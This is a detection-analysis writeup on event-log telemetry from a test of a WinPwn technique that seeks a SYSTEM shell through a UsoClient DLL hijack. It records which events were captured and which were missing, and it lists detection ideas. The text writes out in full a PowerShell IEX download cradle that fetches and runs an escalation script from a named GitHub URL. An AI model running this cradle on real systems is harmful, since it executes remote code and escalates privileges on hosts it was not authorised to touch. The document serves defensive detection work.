# T1055.001-2: Dynamic-link Library Injection — WinPwn — Get SYSTEM shell via UsoClient DLL Load

## Technique Context

T1055.001 Dynamic-link Library Injection involves forcing a legitimate process to load and execute a malicious DLL. This test implements a specific technique from the WinPwn framework targeting the Windows Update Service Orchestrator client (`UsoClient.exe`) and its DLL search order behavior. The `UsoClient` DLL hijack technique exploits the fact that UsoClient runs as SYSTEM and uses a DLL (`WindowsUpdateClient.dll`) that can potentially be side-loaded from a path earlier in the search order than the legitimate system path. By placing a malicious DLL with the expected name in a writable directory that appears before `System32` in the search path, an attacker causes SYSTEM-privileged code execution without any explicit process injection API calls.

This is a privilege escalation path rather than a lateral movement tool. The goal is a SYSTEM shell on the local machine by abusing the UsoClient service's DLL loading behavior. The technique is documented in the S3cur3Th1sSh1t `Get-System-Techniques` repository. It differs from `mavinject.exe`-based injection in that there is no explicit `CreateRemoteThread` — the injection happens passively through DLL search order manipulation.

The attack is initiated via a PowerShell `IEX` (Invoke-Expression) download cradle, fetching the script directly from GitHub: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')`. This means the attack requires outbound internet connectivity and the remote script content would need to be logged via script block logging to be visible in telemetry.

## What This Dataset Contains

The execution proceeds with Defender disabled. The primary signal is the download cradle invocation itself.

**Security EID 4688 — process creation (4 events):** The critical command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}
```

This is the complete attack invocation. The parent PowerShell (PID 5820) also creates `whoami.exe` for system enumeration. All execute as `NT AUTHORITY\SYSTEM`.

**Sysmon EID 10 — process access (4 events):** PowerShell (PID 5820) accessing `whoami.exe` (PID 4504 and others) and a child PowerShell (PID 5820 → PID 17628) with `GrantedAccess: 0x1fffff`. The call trace runs through `System.Management.Automation.ni.dll` — this is the ART test framework's child process creation, not the DLL injection technique.

**Sysmon EID 7 — image load (22 events):** .NET CLR components and Defender DLLs in PowerShell processes. `urlmon.dll` loads into the PowerShell process executing the download cradle — this is consistent with PowerShell initiating an HTTP request.

**Sysmon EID 1 — process create (4 events):** `whoami.exe` (twice, tagged `T1033`) and child PowerShell processes.

**Sysmon EID 17 — named pipe create (3 events):** PowerShell host pipes.

**Sysmon EID 11 — file create (1 event):** PowerShell startup profile.

**PowerShell EID 4104 (98 events):** Test framework boilerplate. The downloaded script content does not appear in script block logging — either the download failed, or the script executed but its content was not captured in the sample window.

**Comparison to defended dataset:** The defended version recorded 36 sysmon, 10 security, and 39 powershell events. The undefended dataset: 34 sysmon, 4 security, 98 powershell events. Nearly identical Sysmon profiles. In the defended run, the child PowerShell exited with status `0x1` (failure), and no download occurred. The undefended run may have attempted the download but the remote script content is absent from the logged script blocks in the samples.

## What This Dataset Does Not Contain

- No script block logging for the downloaded PowerShell content. The attack's actual DLL placement and service manipulation code does not appear in the 4104 events visible in the samples.
- No Sysmon EID 3 (NetworkConnect) events showing the HTTPS connection to `raw.githubusercontent.com`. The network connection either did not occur, was not captured in the monitoring window, or the test environment lacked internet connectivity.
- No `UsoClient.exe` process creation. If the DLL hijack succeeded, UsoClient would be launched with SYSTEM privileges to trigger the DLL load.
- No DLL image-load events showing the malicious DLL loading into any process.
- No SYSTEM shell artifacts — no `cmd.exe` or other shell spawned from the UsoClient service.

## Assessment

This dataset's primary value is the command-line evidence of the download cradle invocation and the specific GitHub URL containing the attack payload. The `IEX(New-Object Net.WebClient).DownloadString()` pattern is one of the most commonly detected PowerShell attack patterns, and the specific URL provides attribution to the WinPwn/S3cur3Th1sSh1t technique library. However, the dataset lacks evidence of the technique executing successfully — the DLL hijack artifacts are absent.

For defenders, this dataset demonstrates that command-line logging (Security EID 4688) provides the download URL even when script block logging fails to capture the downloaded content. It is directly useful for building download-cradle detections and for testing whether existing PowerShell-based network detection rules fire on this specific pattern.

## Detection Opportunities Present in This Data

1. Security EID 4688 `CommandLine` containing `iex(new-object net.webclient).downloadstring` — the IEX download cradle pattern is broadly detected; this specific URL (`S3cur3Th1sSh1t/Get-System-Techniques`) is an additional specificity layer.

2. The GitHub raw content URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1` as a network connection or DNS query would be a high-confidence indicator.

3. `urlmon.dll` loading into a PowerShell process running as SYSTEM in `C:\Windows\TEMP\` indicates web-initiated content retrieval from a highly-privileged context.

4. The Sysmon EID 10 call trace from PowerShell to child PowerShell via `System.Management.Automation.ni.dll` with PROCESS_ALL_ACCESS is the ART test framework pattern — but in production, a SYSTEM-level PowerShell opening another SYSTEM-level PowerShell with full access from a temp directory is anomalous.

5. A child PowerShell process spawned from a parent PowerShell with PROCESS_ALL_ACCESS access that then exits with failure code `0x1` while executing a download cradle suggests blocked outbound connectivity or a failed remote resource. Correlating exit codes with download cradle command lines identifies network-dependent attack failures.

6. In environments where `UsoClient.exe` behavior is baselined, an unexpected execution of `UsoClient.exe` from a non-standard parent or with a missing system DLL would indicate a successful DLL hijack.
